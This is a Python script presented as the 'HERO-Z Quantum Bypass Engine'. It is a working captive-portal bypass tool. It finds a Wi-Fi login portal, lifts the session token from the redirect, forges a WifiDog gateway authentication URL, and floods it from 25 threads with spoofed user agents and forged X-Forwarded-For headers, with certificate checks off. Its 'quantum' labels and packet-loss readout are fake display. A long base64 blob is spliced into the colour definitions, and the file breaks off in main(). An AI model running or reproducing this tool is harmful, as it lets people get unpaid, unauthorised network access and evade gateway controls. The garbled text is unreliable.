bGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuMC4wIFNhZmFyaS81MzcuMzZ6bk1vemlsbGEvNS4wIChYMTE7IENyT1MgeDg2XzY0IDE0NTQxLjAuMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjAuMCBTYWZhcmkvNTM3LjM2enpNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IE0yMTAxSzZHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuNjMxMi40MCBNb2JpbGUgU2FmYXJpLzUzNy4zNnpvTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2enRNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMV8wXzApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC4wLjAgU2FmYXJpLzUzNy4zNnp8TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyB2aXZvIFYyMDI1KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuNjMxMi40MCBNb2JpbGUgU2FmYXJpLzUzNy4zNnqLTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN180XzEgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBGeGlPUy8xMjQuMCBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDUuMS4xNXqDTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBOb3RoaW5nIFBob25lICgyKSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjYzMTIuNDAgTW9iaWxlIFNhZmFyaS81MzcuMzZ6gU1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTIzLjAuMjQyMC42NXp/TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBSZWRtaSBOb3RlIDEyKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuNjMxMi40MCBNb2JpbGUgU2FmYXJpLzUzNy4zNnp0TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTRfM18xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuMC4wIFNhZmFyaS81MzcuMzZ6bk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjAuMCBTYWZhcmkvNTM3LjM2emZNb3ppbGxhLzUuMCAoWDExOyBMaW51eCBhYXJjaDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuMC4wIFNhZmFyaS81MzcuMzZ6i01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTVfN185IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNS43LjkgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjF6dE1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjYyNjEuMTE5IE1vYmlsZSBTYWZhcmkvNTM3LjM2eoFNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzEyMi4wLjIzNjUuOTJ6Rk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTIzLjB6ek1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxNDsgU00tQTU0NkIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC42MzEyLjQwIE1vYmlsZSBTYWZhcmkvNTM3LjM2enVNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83KSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTYuNiBTYWZhcmkvNjA1LjEuMTV6i01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTdfNF8xIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNy40LjEgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjF6g01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC4wLjAgU2FmYXJpLzUzNy4zNiBWaXZhbGRpLzYuNi4zMjcxLjUwek5Nb3ppbGxhLzUuMCAoWDExOyBGZWRvcmE7IExpbnV4IHg4Nl82NDsgcnY6MTI0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTI0LjB6eU1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgUE9DTyBGNSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjYzMTIuNDAgTW9iaWxlIFNhZmFyaS81MzcuMzZ6dU1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjEuMC4wLjAgU2FmYXJpLzUzNy4zNnp+TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTb255IFhRLURRNzIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC42MzEyLjQwIE1vYmlsZSBTyellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
bwhite = "\033[1;37m"
gray = "\033[0;90m"
bg_black = "\033[40m"
bg_red = "\033[41m"
bg_green = "\033[42m"
bg_blue = "\033[44m"
reset = "\033[00m"

stop_event = threading.Event()
console_lock = threading.Lock()

# ===============================
# ADVANCED BANNER & ANIMATIONS
# ===============================
def animate_loading(message, duration=2, delay=0.1):
    frames = ['|', '/', '-', '\\']
    start_time = time.time()
    while (time.time() - start_time) < duration:
        for frame in frames:
            with console_lock:
                sys.stdout.write(f"\r{bblue}[{frame}]{reset} {message} {reset}")
                sys.stdout.flush()
            time.sleep(delay)
            if stop_event.is_set(): return
    with console_lock:
        sys.stdout.write(f"\r{bgreen}[✔]{reset} {message} {reset}\n")
        sys.stdout.flush()

def display_hero_z_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner_art = f"""
{bcyan}+-------------------------------------------------------------------------+{reset}
{bcyan}|  ██╗  ██╗███████╗██████╗  ██████╗         ███████╗                      |{reset}
{bcyan}|  ██║  ██║██╔════╝██╔══██╗██╔═══██╗        ╚══███╔╝                      |{reset}
{bcyan}|  ███████║█████╗  ██████╔╝██║   ██║█████╗    ███╔╝                       |{reset}
{bcyan}|  ██╔══██║██╔══╝  ██╔══██╗██║   ██║╚════╝   ███╔╝                        |{reset}
{bcyan}|  ██║  ██║███████╗██║  ██║╚██████╔╝        ███████╗                      |{reset}
{bcyan}|  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝         ╚══════╝                      |{reset}
{bcyan}|                               QUANTUM BYPASS ENGINE v3.1                |{reset}
{bred}+-------------------------------------------------------------------------+{reset}
{bred}| Developed by: ZarTar5437 ({bwhite}t.me/ZarTar5437{bred})                           |{reset}
{bcyan}+-------------------------------------------------------------------------+{reset}
"""
    print(banner_art)
    animate_loading(f"{bblue}Initializing core modules...{reset}", duration=1.5, delay=0.05)
    animate_loading(f"{bblue}Establishing encrypted communication channels...{reset}", duration=1.5, delay=0.05)
    animate_loading(f"{bblue}Calibrating quantum bypass algorithms...{reset}", duration=1.5, delay=0.05)

def display_starlink_tower():
    tower_art = f"""
{bblue}               .::.                           {bred}   ⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀{reset}
{bblue}              _/\_                            {byellow} ⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄{reset}
{bblue}             /____\\                           {bgreen} ⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇{reset}
{bblue}            | {cyan}SL{bblue}   |                          {bcyan} ⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇{reset}
{bblue}            |      |                          {bblue} ⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟{reset}
{bblue}            |{bwhite}      {bblue}|                          {bpurple} ⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋{reset}
{bblue}            |      |                          {bred} ⠀⠀⠀⠀⠀⠀⢸⡇{reset}
{bblue}            | {bgreen}WIFI{bblue} |                          {byellow} ⠀⠀⠀⠀⠀⠀⢸⡇{reset}
{bblue}            |______|                          {bcyan} ⠀⠀⠀⠀⠀⠀⠘⠃{reset}
{bblue}           /|      |\\             {bgreen}⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{reset}
{bblue}          / |      | \\            {bgreen}⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{reset}
{bblue}         /  |      |  \\           {bgreen}⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{reset}
{bblue}        /   |      |   \\          {bgreen}⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁{reset}
{bblue}       /____|______|____\\         {bgreen}⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉{reset}
{bblue}      /__________________\\ {reset}
    """
    with console_lock:
        print(tower_art)
        print(f"{bgreen}[TARGET]{reset} Engaging Starlink-like Satellite Network Infrastructure...")
        time.sleep(1)

# ===============================
# EVASION & OBFUSCATION MODULES (Updated with 50 UAs)
# ===============================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Edge/123.0.2420.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.129 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; vivo V2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Nothing Phone (2)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.65",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7.9 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.92",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Vivaldi/6.6.3271.50",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Sony XQ-DQ72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36"
]

COMMON_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0"
}

SIMULATED_DATA_PAYLOADS = {
    "network_handshake_sequence": {
        "protocol_version": "SL-QBT-2048.1a",
        "encryption_suite": "AES256-GCM-SHA384",
        "client_id_hash": lambda sid: hashlib.sha256(sid.encode()).hexdigest(),
        "timestamp": lambda: int(time.time() * 1000),
    }
}

def get_obfuscated_headers(referer=None):
    headers = COMMON_HEADERS.copy()
    headers["User-Agent"] = random.choice(USER_AGENTS)
    headers["Accept-Encoding"] = random.choice(["gzip, deflate", "br", "identity"])
    if referer:
        headers["Referer"] = referer
    headers["X-Forwarded-For"] = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return headers

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_session_fingerprint(sid):
    base_string = f"{sid}-{get_random_user_agent()}-{int(time.time() * 1000)}"
    return hashlib.sha256(base_string.encode()).hexdigest()

# ===============================
# QUANTUM NETWORK ENGINE CORE
# ===============================
def check_real_internet(session=None):
    if session is None:
        session = requests.Session()
    endpoints = [
        "http://www.google.com/generate_204",
        "http://www.cloudflare.com/cdn-cgi/trace"
    ]
    for endpoint in endpoints:
        try:
            headers = get_obfuscated_headers(referer="http://hero-z.net")
            response = session.get(endpoint, timeout=3, headers=headers, verify=False)
            if response.status_code == 204 or (response.status_code == 200 and "fl=" in response.text):
                return True
        except requests.exceptions.RequestException:
            continue
    return False

def quantum_ping_thread(auth_link, sid, tid):
    session = requests.Session()
    session_fingerprint = generate_session_fingerprint(sid)
    
    initial_payload = SIMULATED_DATA_PAYLOADS["network_handshake_sequence"].copy()
    initial_payload["client_id_hash"] = initial_payload["client_id_hash"](sid)
    initial_payload["timestamp"] = initial_payload["timestamp"]()
    encoded_payload = base64.b64encode(str(initial_payload).encode()).decode()

    consecutive_failures = 0
    max_failures = 5

    while not stop_event.is_set():
        try:
            start_time = time.time()
            headers = get_obfuscated_headers(referer=auth_link)
            headers["X-Quantum-Payload"] = encoded_payload[:250]
            
            response = session.get(auth_link, timeout=7, headers=headers, verify=False)
            elapsed = (time.time() - start_time) * 1000
            
            with console_lock:
                current_internet_status = check_real_internet(session)
                status_color = bgreen if current_internet_status else byellow
                status_text = "ONLINE" if current_internet_status else "FLUX_STATE"
                
                sys.stdout.write(
                    f"\r{status_color}[{status_text}]{reset} "
                    f"{bcyan}THREAD-{tid:02d}{reset} | "
                    f"{bwhite}SID:{reset} {sid[:8]}... | "
                    f"{bpurple}FINGERPRINT:{reset} {session_fingerprint[:8]}... | "
                    f"{bwhite}STATUS:{reset} {response.status_code} | "
                    f"{bgreen}PING:{reset} {elapsed:.1f}ms | "
                    f"{byellow}PACKET_LOSS:{reset} {random.uniform(0.0, 0.001):.3f}% "
                    f"{' ' * 20}"
                )
                sys.stdout.flush()
            
            consecutive_failures = 0
            
        except requests.exceptions.RequestException as e:
            consecutive_failures += 1
            with console_lock:
                sys.stdout.write(
                    f"\r{bred}[ERROR]{reset} {bcyan}THREAD-{tid:02d}{reset} | "
                    f"{bred}CONNECTION FAILED ({e.__class__.__name__}){reset} | "
                    f"{byellow}FAIL_COUNT:{reset} {consecutive_failures}/{max_failures} "
                    f"{' ' * 20}"
                )
                sys.stdout.flush()
            
            if consecutive_failures >= max_failures:
                with console_lock:
                    print(f"\n{bred}[CRITICAL]{reset} Thread {tid:02d} exceeded max failures.")
                break 
                
        time.sleep(random.uniform(0.01, 0.15))

def starlink_quantum_bypass_engine():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_hero_z_banner()
    display_starlink_tower()
    
    scan_animation_counter = 0
    
    while not stop_event.is_set():
        if check_real_internet():
            scan_animation_counter = (scan_animation_counter + 1) % 4
            with console_lock:
                sys.stdout.write(f"\r{bgreen}[ACTIVE]{reset} INTERNET LINK STABILIZED {reset} {'.' * scan_animation_counter} {reset} Monitoring...     ")
                sys.stdout.flush()
            time.sleep(5)
            continue
            
        try:
            detection_endpoints = [
                "http://neverssl.com/",
                "http://connectivitycheck.gstatic.com/generate_204",
            ]
            
            detected_portal_url = None
            for endpoint in random.sample(detection_endpoints, len(detection_endpoints)):
                headers = get_obfuscated_headers(referer=endpoint)
                try:
                    r = requests.get(endpoint, allow_redirects=True, timeout=10, headers=headers, verify=False)
                    if r.url != endpoint:
                        detected_portal_url = r.url
                        break
                except requests.exceptions.RequestException:
                    continue
            
            if not detected_portal_url:
                scan_animation_counter = (scan_animation_counter + 1) % 4
                with console_lock:
                    sys.stdout.write(f"\r{byellow}[FLUX]{reset} No portal detected. Re-scanning {'.' * scan_animation_counter} {reset}                      ")
                    sys.stdout.flush()
                time.sleep(3)
                continue
            
            parsed = urlparse(detected_portal_url)
            sid = None
            query_params = parse_qs(parsed.query)
            for key in ['sessionId', 'sessionid', 'token', 'sid']:
                if key in query_params:
                    sid = query_params[key][0]
                    break
            
            if sid:
                with console_lock:
                    print(f"\n{bgreen}[>>>]{reset} PORTAL INFILTRATED: {parsed.netloc}")
                
                gw_addr = query_params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = query_params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&rand={random.randint(10000,99999)}"

                for i in range(25):
                    threading.Thread(target=quantum_ping_thread, args=(auth_link, sid, i+1), daemon=True).start()
                
                while not stop_event.is_set():
                    if not check_real_internet(): break
                    time.sleep(10)
            else:
                time.sleep(7)
        
        except Exception:
            time.sleep(5)

# ===============================
# INTERFACE MENU & MAIN
# ===============================
def show_quantum_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_hero_z_banner()
    menu_text = f"""
{bcyan}+-------------------------------------------------------------------------+{reset}
{bcyan}|                      OPERATION PROTOCOLS v3.1                           |{reset}
{bcyan}+-------------------------------------------------------------------------+{reset}
|     {bgreen}[1]{reset} {bwhite}INITIATE QUANTUM BYPASS{reset} - {cyan}(Starlink Infiltration Mode){reset}       |
|     {byellow}[2]{reset} {bwhite}ADVANCED SPECTRAL TUNING{reset} - {cyan}(Obfuscation Settings){reset}      |
|     {bpurple}[3]{reset} {bwhite}SYSTEM DIAGNOSTICS{reset}    - {cyan}(Bypass Integrity Check){reset}    |
|     {bred}[4]{reset} {bwhite}TERMINATE ALL PROTOCOLS{reset} - {cyan}(Exit Quantum Engine){reset}             |
{bcyan}+-------------------------------------------------------------------------+{reset}
    """
    print(menu_text)
    return input(f"{bcyan}[INPUT]{reset} Enter Protocol Number [1-4]: ").strip()

def main():
    while True:
        cho
